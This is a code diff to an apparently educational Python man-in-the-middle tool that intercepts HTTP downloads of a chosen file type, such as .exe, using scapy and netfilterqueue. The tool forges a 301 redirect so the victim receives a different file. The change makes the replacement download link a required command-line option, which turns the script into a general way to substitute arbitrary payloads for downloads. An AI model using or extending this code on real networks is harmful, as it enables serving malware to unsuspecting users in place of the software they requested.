@@ -10,9 +10,14 @@ def get_parameters():
     parser = optparse.OptionParser()
     parser.add_option('-f', '--file', dest='file',
                       help='file or file type to intercept, default is exe.')
+    parser.add_option('-d', '--downloadlink', dest='downloadlink',
+                      help='downloadlink to redirect the target')
     (options, arguments) = parser.parse_args()
     if not options.file:
         options.file = 'exe'
+    if not options.downloadlink:
+        parser.error(
+            "[-] download link is required. use --help for more information")
     return options
 
 
@@ -29,7 +34,8 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 print("[+] replacing file")
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.winimage.com/download/winima90.exe\n\n"
+                scapy_packet[scapy.Raw].load = (
+                    "HTTP/1.1 301 Moved Permanently\nLocation: %s\n\n" % options.downloadlink)
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
@@ -44,6 +50,5 @@ try:
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
-
 except KeyboardInterrupt:
     subprocess.call("iptables --flush", shell=True)
